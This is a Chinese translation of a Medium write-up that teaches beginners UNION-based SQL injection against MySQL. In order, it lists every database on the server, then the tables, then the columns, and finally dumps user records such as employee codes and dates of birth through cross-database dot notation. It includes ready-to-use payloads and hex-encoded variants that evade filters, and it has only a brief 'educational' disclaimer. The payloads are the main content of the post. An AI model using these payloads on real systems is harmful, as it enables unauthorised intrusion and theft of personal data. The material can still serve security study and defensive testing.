<html>
<head>
<title>A technique that a lot of SQL injection beginners don’t know | Atmanand Nagpure write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">许多SQL注入初学者不知道的技巧| Atmanand Nagpure写文章</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/a-technique-that-a-lot-of-sql-injection-beginners-dont-know-atmanand-nagpure-write-up-abdc7c269dd5?source=collection_archive---------0-----------------------#2019-03-21">https://infosecwriteups.com/a-technique-that-a-lot-of-sql-injection-beginners-dont-know-atmanand-nagpure-write-up-abdc7c269dd5?source=collection_archive---------0-----------------------#2019-03-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="2801" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你好。带着另一篇关于SQL注入技术的文章回来。<br/>所以，我一直在看很多SQL注入的初学者。虽然他们试图从数据库中提取数据，但他们忽略了他们可以做得更好的事实。<br/>注意，我没有任何破坏任何网站或任何组织的不良企图。这个帖子只是为了教育目的。</p><h1 id="c26b" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated"><strong class="ak">问题:</strong></h1><p id="624d" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">初学者的问题是，他们只从执行易受攻击的查询的当前数据库中提取数据。他们甚至不会尝试访问其他数据库及其内容。因此，许多中级和高级SQL注入者可能知道这样一个事实，即如果以适当的权限执行查询，攻击者就可以访问该SQL server上的其他数据库。<br/>那么，让我们来看看它实际上是怎么做的。</p><h1 id="012b" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated"><strong class="ak">解决方案:</strong></h1><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi lo"><img src="../Images/d5a8c4a1c79ee2f232e6f46a6f722b97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*-C15s4qKS0djRWeJrgFjOQ.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">还是SQL注入吧！！！</figcaption></figure><h2 id="efe2" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated">第一步:</h2><p id="36c5" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">嗯，利用序列的第一部分是提取服务器上存在的数据库的名称。实际上，使用组连接和联合选择可以很容易地做到这一点。</p><blockquote class="mm mn mo"><p id="1d3e" class="jn jo mp jp b jq jr js jt ju jv jw jx mq jz ka kb mr kd ke kf ms kh ki kj kk ij bi translated"><strong class="jp ir">快速提示:</strong> <em class="iq"> UNION ALL SELECT </em>可以用来代替<em class="iq"> UNION SELECT </em>而SQL注入要联合两个结果而不执行<em class="iq"> DISTINCT </em>操作；也就是说，它不会删除副本。</p></blockquote><p id="7f74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，让我们提取服务器上的数据库名称。</p><pre class="lp lq lr ls gt mt mu mv mw aw mx bi"><span id="af5f" class="ma km iq mu b gy my mz l na nb"><strong class="mu ir">Query</strong>: ?param=’ AND 1=2 UNION ALL SELECT 1,(SELECT CAST(GROUP_CONCAT(schema_name,0x0a) as CHAR(4096)) FROM (SELECT * FROM information_schema.schemata)a),3,4,5,6,7,8,9 -- -</span></pre><h2 id="d182" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated">解释:</h2><p id="ec02" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">原始查询的表中有9列。您可以通过技术使用<em class="mp">命令找到它。因此，我编写了<em class="mp"> UNION ALL </em> select 1，2，3，4，5，6，7，8，9，并提取了位置2处的数据，并将其替换为自己的嵌套select查询。</em></p><p id="1380" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">GROUP_CONCAT()函数用于连接返回结果的所有行。这里我使用了嵌套选择。在内部的<em class="mp"> SELECT </em>语句中，我选择了<em class="mp">information _ schema . schemata表</em>中的所有行。<br/><em class="mp">information _ schema . schemata</em>是一个表，其中存储了该服务器上存在的数据库的所有名称和其他信息。</p><p id="43a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我对GROUP_CONCAT()结果执行了显式类型转换，以增加结果缓冲区的大小来存储和显示更多的结果。可以在MySQL和其他一些服务器中使用<em class="mp"> LIMIT m，n </em>返回m和n范围内的行。</p><h2 id="7787" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated">结果1:</h2><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/010524604363d9fa4c524b87b7e4fe5b.png" data-original-src="https://miro.medium.com/v2/resize:fit:846/format:webp/1*ltOAPgq1UH3n_X5xrgWIQw.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">服务器上的数据库。</figcaption></figure></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><h2 id="a633" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated"><strong class="ak">第二步:</strong></h2><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/b950a41819310937bfd1ad98f747051f.png" data-original-src="https://miro.medium.com/v2/resize:fit:580/format:webp/1*vfoImwg4zPPrTz2wwUY1jA.jpeg"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">SqL注入:表格和狗屎布鲁！</figcaption></figure><p id="8dca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，接下来要做的事情是从我们选择的数据库中提取表名。让我们从名为“training”的数据库中提取表格。我们将这样做:</p><pre class="lp lq lr ls gt mt mu mv mw aw mx bi"><span id="444b" class="ma km iq mu b gy my mz l na nb"><strong class="mu ir">Query: </strong>' AND 1=2 UNION ALL SELECT 1,(SELECT CAST(GROUP_CONCAT(table_name,0x0a) as CHAR(4096)) FROM (SELECT * FROM information_schema.tables WHERE table_schema='training')a),3,4,5,6,7,8,9 -- -</span></pre><h2 id="d9db" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated">结果2:</h2><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/838ce56ca517caf9ed003761f3a73352.png" data-original-src="https://miro.medium.com/v2/resize:fit:728/format:webp/1*hycyFiOMnX1oDJ95EyXlvQ.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">数据库中存在的表'培训'</figcaption></figure></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><h2 id="25ce" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated"><strong class="ak">第三步:</strong></h2><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/7737199e9d1bc25c787e3d143227af55.png" data-original-src="https://miro.medium.com/v2/resize:fit:600/format:webp/1*zbPBgkqe1NMn3YfyQfkdPg.jpeg"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">有人来了！！！</figcaption></figure><p id="bfb5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，我们将从我们选择的表中提取列名。我们可以用不同的方式来做，比如一次性完成(DIOS) SQL注入。但是为了保持事情的简单和初学者友好，让我们只关注基本和简单的东西。</p><p id="1905" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们使用以下查询从名为“start_15_users”的表中提取列名:</p><pre class="lp lq lr ls gt mt mu mv mw aw mx bi"><span id="d043" class="ma km iq mu b gy my mz l na nb"><strong class="mu ir">Query: </strong>' AND 1=2 UNION ALL SELECT 1,(SELECT CAST(GROUP_CONCAT(column_name,0x0a) as CHAR(4096)) FROM (SELECT * FROM information_schema.columns WHERE table_name='start_15_users')a),3,4,5,6,7,8,9 -- -</span></pre><h2 id="6ae9" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated">结果3:</h2><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/131f4431e78ebc42a30f5bb11b509c7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:436/format:webp/1*sJGMuI-4g_XE6bjJWznRQA.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">从名为“start_15_users”的表中提取的列名</figcaption></figure></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><h2 id="8a69" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated">初学者的问题来了:</h2><p id="badf" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">许多初学者不知道如何从不同的数据库中提取数据。<br/><strong class="jp ir">结构化查询语言</strong> (SQL)提供了从不同数据库获取数据的功能。的’。<strong class="jp ir"> </strong> ' <strong class="jp ir">(圆点)</strong>操作。</p><h2 id="400b" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated">用法:</h2><pre class="lp lq lr ls gt mt mu mv mw aw mx bi"><span id="ac30" class="ma km iq mu b gy my mz l na nb">SELECT * from database_name.table_name;</span></pre><p id="08b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">就这么简单。但是，大多数初学者仍然不知道这种技术。</p></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><h2 id="9a7a" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated">最后一步:</h2><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi no"><img src="../Images/15056af1f1d8a37657afe68da89378b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*SomBmpaeU6OU0n4hImON1Q.jpeg"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">我们得到了它的人！！！</figcaption></figure><p id="b978" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，让我们实际上从名为“start_15_users”的表中获取数据。</p><p id="c5f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">查询:</strong></p><pre class="lp lq lr ls gt mt mu mv mw aw mx bi"><span id="6e02" class="ma km iq mu b gy my mz l na nb">' AND 1=2 UNION ALL SELECT 1,(SELECT CAST(GROUP_CONCAT("UserId:",UserID,0x3a,"EmpCode:",EmpCode,0x3a,"DOB:",DOB,0x3a,"IsActive:",IsActive,0x0a) as CHAR(4096)) FROM (SELECT * FROM training.start_15_users)a),3,4,5,6,7,8,9 -- -</span></pre><p id="6003" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">与以下内容相同:</p><pre class="lp lq lr ls gt mt mu mv mw aw mx bi"><span id="c018" class="ma km iq mu b gy my mz l na nb">' AND 1=2 UNION ALL SELECT 1,(SELECT CAST(GROUP_CONCAT(0x5573657249443a,UserID,0x3a,0x456d70436f64653a,EmpCode,0x3a,0x444f423a,DOB,0x3a,0x49734163746976653a,IsActive,0x0a) as CHAR(4096)) FROM (SELECT * FROM training.start_15_users)a),3,4,5,6,7,8,9 -- -</span></pre><p id="da25" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">与以下内容相同:</p><pre class="lp lq lr ls gt mt mu mv mw aw mx bi"><span id="5e60" class="ma km iq mu b gy my mz l na nb">' AND 1=2 UNION ALL SELECT 1,(SELECT CAST(GROUP_CONCAT(0x55,0x73,0x65,0x72,0x49,0x64,0x3a,UserID,0x3a,0x45,0x6d,0x70,0x43,0x6f,0x64,0x65,0x3a,EmpCode,0x3a,0x44,0x4f,0x42,0x3a,DOB,0x3a,0x49,0x73,0x41,0x63,0x74,0x69,0x76,0x65,0x3a,IsActive,0x0a) as CHAR(4096)) FROM (SELECT * FROM training.start_15_users)a),3,4,5,6,7,8,9 -- -</span></pre><h2 id="9478" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated">最终结果:</h2><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi np"><img src="../Images/47481505a894d47fda81421e5dd24862.png" data-original-src="https://miro.medium.com/v2/resize:fit:868/format:webp/1*lxcEg_6I3a9ZqL6WqQ3VXw.png"/></div><figcaption class="lw lx gj gh gi ly lz bd b be z dk translated">从名为“start_15_users”的表中提取的最终数据</figcaption></figure></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><h2 id="0a7b" class="ma km iq bd kn mb mc dn kr md me dp kv jy mf mg kz kc mh mi ld kg mj mk lh ml bi translated">最终注释:</h2><blockquote class="mm mn mo"><p id="1622" class="jn jo mp jp b jq jr js jt ju jv jw jx mq jz ka kb mr kd ke kf ms kh ki kj kk ij bi translated"><strong class="jp ir">注0x00 </strong>:由于GROUP_CONCAT函数不会返回所有结果，我建议您使用SQL的<em class="iq"> LIMIT m，n </em>来限制m和n的记录；这是两个自然数。或者您可以使用SQL提供的CAST()函数来执行显式类型转换。</p><p id="5862" class="jn jo mp jp b jq jr js jt ju jv jw jx mq jz ka kb mr kd ke kf ms kh ki kj kk ij bi translated"><strong class="jp ir">注0x01: </strong>在SQL中可以用#代替双破折号操作符来注释代码。</p></blockquote></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><p id="0ff2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">今天就到这里吧！<br/>感谢您的阅读！</p><p id="26c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">问候，<br/>阿特曼和纳格普里(proghax333)</p><p id="d0df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">我的另一篇帖子:<br/>。</strong> NET SQL注入穿透错误:<a class="ae nq" href="https://medium.com/@skillzworldtech/sql-injection-data-extraction-through-net-framework-error-ec9972858321" rel="noopener">https://medium . com/@ skillzworldtech/SQL-Injection-data-extraction-through-NET-framework-error-EC 9972858321</a></p></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><p id="0fbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mp">关注</em> <a class="ae nq" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="mp"> Infosec报道</em> </a> <em class="mp">获取更多此类精彩报道。</em></p><div class="nr ns gp gr nt nu"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nv ab fo"><div class="nw ab nx cl cj ny"><h2 class="bd ir gy z fp nz fr fs oa fu fw ip bi translated">信息安全报道</h2><div class="ob l"><h3 class="bd b gy z fp nz fr fs oa fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="oc l"><p class="bd b dl z fp nz fr fs oa fu fw dk translated">medium.com</p></div></div><div class="od l"><div class="oe l of og oh od oi lu nu"/></div></div></a></div></div></div>    
</body>
</html>